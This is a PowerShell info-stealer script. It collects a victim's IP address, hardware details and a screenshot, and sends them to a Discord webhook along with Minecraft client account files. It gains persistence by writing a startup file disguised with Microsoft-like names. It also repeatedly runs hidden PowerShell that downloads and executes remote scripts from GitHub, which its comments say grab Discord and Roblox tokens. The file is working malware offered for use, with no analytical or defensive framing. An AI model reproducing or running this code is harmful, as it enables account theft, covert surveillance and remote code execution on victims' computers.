#$webHookUrl='for dev ! '
#####################################################################
$webHookUrlPYTHON="'"+$webHookUrl+"'"
$webHookUrlPYTHON2="""$webHookUrl"""
$webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
$webHookUrl2="$"+"webHookUrl"
##
$ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
$gpu = (Get-WmiObject win32_VideoController).Name
$cpu = (Get-WmiObject Win32_Processor).Name
$hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
$ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
#####################################################################


#####################################################################
Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
@echo off
powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/g.ps1).content)
"
#####################################################################

#####################################################################
$Path = "C:\Windows\Temp"
$FileName = "MicrosoftPolicy.png"
$File = "$Path\$FileName"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($File) 
######################################################################


#####################################################################
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,

    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$Body = @{
  'content' = $text
}


if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $webHookUrl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $webHookUrl}
}
######################################################################


######################################################################
[System.Collections.ArrayList]$embedArray = @()
$thumbUrl = 'https://streamsentials.com/wp-content/uploads/2022/06/EZ-transparent-png.png' 
$thumbnailObject = [PSCustomObject]@{
	
    url = $thumbUrl
	
}
$color = '12517376'
$title = 'Info of '
$description = 'IP: ' + '`' + $ip + '`' + '
GPU: ' + '`' + $GPU + '`' + '
CPU: ' + '`' + $CPU + '`' + '
RAM: ' + '`' + $ram + '`' + '
HWID: ' + '`' + $hwid + '`' + '
Discord: '

$embedObject = [PSCustomObject]@{
    color = $color
    title = $title + '`' + $env:UserName + '`'
    description = $description 
    thumbnail = $thumbnailObject
}

$embedArray.Add($embedObject)
$payload = [PSCustomObject]@{
	
    embeds = $embedArray
	
}

######################################################################

powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/UUID.ps1).content)
#For grab discord tokens

powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/UUID_gen.ps1).content)
#For grab roblox info/tokens

#powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/UUID_use.ps1).content)
#For grab all cookies (thx to https://github.com/Smug246/Luna-Token-Grabber)
#NOT IMPLEMENTED

#powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/UUID_utils.ps1).content)
#For idk lol

######################################################################

Upload-Discord -text "||@everyone||"
Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
Upload-Discord -file "C:\Windows\Temp\MicrosoftPolicy.png"
Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
python C:\Windows\Temp\Win.microsoft.Security.temp\UUID.ps1
python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_gen.ps1
#python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_use.ps1
#python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_utils.ps1

######################################################################

